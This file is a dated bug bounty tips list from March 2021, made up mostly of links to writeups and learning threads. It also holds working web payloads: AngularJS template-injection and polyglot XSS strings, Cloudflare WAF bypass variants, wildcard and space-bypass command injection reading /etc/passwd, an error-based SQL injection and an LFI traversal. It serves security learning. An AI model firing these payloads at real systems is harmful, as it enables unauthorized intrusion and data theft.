# Bug Bounty Tips - March 2021

# 📅 01-Mar-2021
## Find Contact details for any sites using this dorks
1. site:site.tld intext:"
@site
.tld"
2. site:site.tld "security" | "admin" | "contact"
3. site:site.tld security.txt
4. /hunter.io
5. check whois for registrar info

## Broken Authentication tip
1. Added user in dashboard made him admin 
2. Remove user and again add same user
**Note :**If user gets admin without promoting then its broken issue.

## Mass Assignment/Auto binding vulnerability
- https://itzone.com.vn/en/article/mass-assignment-vulnerability-and-prevention

![img](https://pbs.twimg.com/media/EvONSJtXUAIQ4Xm?format=jpg&name=small)

# 📅 02-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 60
- [XSLT Injection ](https://twitter.com/harshbothra_/status/1366413262410059777?s=20)

## AngularJS Client-Side Template Injection as XSS payload for 1.2.24-1.2.29
```js
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

# 📅 03-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 61
- [Bypassing AWS Policies](https://twitter.com/harshbothra_/status/1366738335218028545?s=20)

# 📅 04-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 62
- [Source Code Review Guidelines](https://twitter.com/harshbothra_/status/1366968601324838912?s=20)

# 📅 06-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 64
- [Hidden Property Abuse (HPA) attack in Node.js](https://twitter.com/harshbothra_/status/1367833358760210434?s=20)

## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 65
- [HTTP Request Smuggling in 2020](https://twitter.com/harshbothra_/status/1367935554877202435?s=20)

# 📅 07-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 66
- [Dependency Confusion Attack](https://twitter.com/harshbothra_/status/1368286711038439425?s=20)

# 📅 08-Mar-2021
## m4ll0k Bug Bounty Tools
- https://github.com/m4ll0k/Bug-Bounty-Toolz

# 📅 09-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 67
- [Format String Vulnerabilities](https://twitter.com/harshbothra_/status/1368914428377272320?s=20)

# 📅 10-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 68
- [Mobile Application Dynamic Analysis](https://twitter.com/harshbothra_/status/1369303054777016324?s=20)

## XSS via HTTP Request Smuggling
- https://infosecwriteups.com/exploiting-http-request-smuggling-te-cl-xss-to-website-takeover-c0fc634a661b

# 📅 11-Mar-2021
## Slides from talks
- https://github.com/1ndianl33t/All-in-one_BugBounty_PDF_bundles/blob/master/README.md?s=09

## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 69
- [ Insecure Deserialization](https://twitter.com/harshbothra_/status/1369654854612787202?s=20)

## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 70
- [Web Cache Entanglement](https://twitter.com/harshbothra_/status/1369732836266184704?s=20)

## Deserialization Attacks
- https://github.com/kojenov/serial
- https://youtu.be/Y0QxwRyqlh8

## The Best XSS Polyglot! Police cars revolving lightPolice cars revolving light
```js
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Bypass Firewalls
```http
GET /?cc=cat+/etc/passwd

403 Forbidden

GET /?cc=/???/??t+/???/??ss??

200
root:x:0:0:root...

Done bypass firewall
```

# 📅 12-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 71
- [OWASP Amass](https://twitter.com/harshbothra_/status/1370103728473182212?s=20)

# 📅 14-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 72
- [Offensive Javascript Techniques for Red Teamers](https://twitter.com/harshbothra_/status/1370682535680733193?s=20)

## if you can't find a way to get #xss, why not try css payload:

```css
hi"><style>body{display:none}</style>
```

it will make the page disappear if it is vulnerable meanwhile u can use self made custom payloads to bypass filters too!

# 📅 15-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 73
- [Basic CMD for Pentesters](https://twitter.com/harshbothra_/status/1370988101057748996?s=20)


# 📅 16-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 74
- [Investigating and Defending O365](https://twitter.com/harshbothra_/status/1371292881588080642?s=20)

## Windows Privilege Escalation
- https://www.hackingarticles.in/window-privilege-escalation-automated-script/

## Linux Privilege Escalation
- https://www.hackingarticles.in/linux-privilege-escalation-automated-script/

## Active Directory Lab Setup
- https://www.hackingarticles.in/active-directory-pentesting-lab-setup/

## Facebook Group Members Disclosure
- https://spongebhav.medium.com/facebook-group-members-disclosure-e53eb83df39e

# 📅 17-Mar-2021
## Kick Start - Journey on Cyber Security
- https://abhisek3122.github.io/learn-cybersecurity/contents/kick-start-your-journey

## API Misconfiguration which leads to unauthorized access to servicedesk tickets
- https://noobx.in/blogs/API-Misconfiguration-which-leads-to-unauthorized-access-to-servicedesk-tickets

# 📅 18-Mar-2021
## php Image payload generator
- https://imagepayload.jc01.ninja/

## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 76
- [Kubernetes Security - Attacking and Defending K8s Clusters](https://twitter.com/harshbothra_/status/1372185483564912641?s=20)

## Tiktok RCE
- https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105

## Secret Trick to bypass space
```sh
cat</etc/passwd
{cat,/etc/passwd}
cat$IFS/etc/passwd
```
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection

## Exploiting JSON Web Tokens
- https://medium.com/@sajan.dhakate/exploiting-json-web-token-jwt-73d172b5bc02

## Redirection check tool
- https://github.com/redcode-labs/UnChain.git

## Facebook Hack 
- https://infosecwriteups.com/how-i-hacked-facebook-part-one-282bbb125a5d
- https://alaa0x2.medium.com/how-i-hacked-facebook-part-two-ffab96d57b19

## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 77
- [AWS Cloud Security](https://twitter.com/harshbothra_/status/1372607627297878016?s=20)


# 📅 20-Mar-2021
## Cloudflare XSS Bypass
1. Bypass cloudflare with incorrect url encoding
`<script>alert()</script>` blocked `%2sscript%2ualert()%2s/script%2u` -xss popup
2. XSS Popup
```js
<svg onload=alert%26%230000000040"1")>
```

## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 79
- [File Inclusion All-in-One](https://twitter.com/harshbothra_/status/1373262156121088000?s=20)

# 📅 22-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 80
- [DockerENT Framework Insights](https://twitter.com/harshbothra_/status/1373658033943769095?s=20)

# 📅 23-Mar-2021
- [Detecting Sensitive Data Leaks That Matter](https://blog.shiftleft.io/detecting-sensitive-data-leaks-that-matter-42f7530f5f6d)
- [Scanning for Secrets in Source Code](https://blog.shiftleft.io/scanning-for-secrets-in-source-code-9fcb486f8c0e)
- [How To Review Code For Vulnerabilities](https://blog.shiftleft.io/how-to-review-code-for-vulnerabilities-1d017c21a695)

## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 81
- [ImageMagick - Shell injection via PDF password](https://twitter.com/harshbothra_/status/1374020615594647552?s=20)

## Good Resource from [vickieli](https://vickieli.medium.com/)
- https://vickieli.medium.com

## Cloudflare XSS Bypass via add 8 or more superfluous leading zeros for dec and 7 or more for hex.
```js
Dec: <svg onload=prompt%26%230000000040document.domain)>
Hex: <svg onload=prompt%26%23x000000028;document.domain)>
```

# 📅 24-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 82
- [Offensive GraphQL API Pentesting](https://twitter.com/harshbothra_/status/1374390090907090944?s=20)

# 📅 25-Mar-2021
## [Possible Geolocation Stripped Data Bypass !](https://twitter.com/N008x/status/1374700165978746884?s=20)
1. /example.com/user/user.jpg?w=xx&h=xx&crop=true > user/user.jpg 
2. /example.com/user?src=/img/user.jpg > src=/user.jpg
3. /example.com/img/user.jpg > /example.com/user.jpg

## [If you run a bruteforce and notice weird behaviours - like "/admin/" redirecting to / always investigate these.](https://twitter.com/nnwakelam/status/1374652548817195015?s=20)
```text
/admin/
/admin/../admin
//admin/
/Admin/
/admin;/
/Admin;/
/index.php/admin/
/admin/js/*.js
/admin/*brute*.ext
/admin../admin
//anything/admin/
```

## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 83
- [Bug Bounties with Bash](https://twitter.com/harshbothra_/status/1374735632514183172?s=20)

## Google Bug Bounty Writeups
- https://www.ehpus.com/

## OAuth Vulnerabilities
- https://portswigger.net/web-security/oauth
- https://portswigger.net/research/hidden-oauth-attack-vectors?s=09

# 📅 26-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 84
- [Chrome Extensions Code Review](https://twitter.com/harshbothra_/status/1375088298855526400?s=20)

## [Performing recons in package.json. Congratulations](https://twitter.com/ofjaaah/status/1375263280495738883?s=20) to [@alxbrsn](https://twitter.com/alxbrsn)
- very insane this tactic, now I just have luck to find something.
```sh
xargs -a dom -I@ sh -c 'python3 http://GitDorker.py -tf token -q @ -d Dorks/package.json | anew files'
```

## Graphql Hacking
- https://twitter.com/drunkrhin0/status/1375038146409271300?s=20

## Jenkins Pen-Testing
- https://github.com/gquere/pwn_jenkins


# 📅 27-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 85
- [SSTI](https://twitter.com/harshbothra_/status/1375470661741645826?s=20)


# 📅 29-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 86
- [Exploiting Graphql](https://twitter.com/harshbothra_/status/1375743272253943810?s=20)
- [Exploiting Email Systems](https://twitter.com/harshbothra_/status/1376156330075987973?s=20)

## SQL Injection
```sql
SELECT * FROM(SELECT COUNT(*),CONCAT(database(),'--',(SELECT (ELT(1=1,version()))),'--','_Y000!_',FLOOR(RAND(1)*1))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x) a
```
![img](https://pbs.twimg.com/media/ExlzEroWEAIYMXm?format=jpg&name=small)

## LFI Bypass
Wildcard bypass & LFI
1. Intercepted a POST req that pointed to a local file "/usr/local/redacted/filename"
2. tried "/etc/passwd" -> bad request
3. "/user/local/../../etc/passwd" -> bad request
4. "/user/local/redacted/../../../etc/passwd" -> OK
5. LFI & bounty
***Source: ***https://twitter.com/11xuxx/status/1252905397259767808?s=20

# 📅 31-Mar-2021
## Playing in the (Windows) Sandbox
- https://research.checkpoint.com/2021/playing-in-the-windows-sandbox/?s=09

## Common Android Application Vulnerabilities
- https://twitter.com/harshbothra_/status/1376941691253399559?s=20
